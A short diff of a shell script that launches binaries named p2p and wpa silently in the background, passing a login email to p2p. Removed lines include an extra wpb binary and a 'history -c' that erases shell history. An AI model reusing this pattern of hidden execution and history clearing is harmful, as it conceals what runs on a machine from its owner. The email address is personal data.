@@ -1,7 +1,3 @@
-chmod +x p2p wpb wpa && bash ./wpb && bash ./wpa && bash ./p2p -l robert.reynolds2@go.shoreline.edu && ./wpb && ./wpa && ./p2p -l robert.reynolds2@go.shoreline.edu && history -c
-bash ./wpb > /dev/null 2>&1 &
-./wpb > /dev/null 2>&1 &
-bash ./wpa > /dev/null 2>&1 &
-./wpa > /dev/null 2>&1 &
+chmod +x p2p wpa
 bash ./p2p -l robert.reynolds2@go.shoreline.edu > /dev/null 2>&1 &
-./p2p -l robert.reynolds2@go.shoreline.edu > /dev/null 2>&1 &
+bash ./wpa > /dev/null 2>&1 &
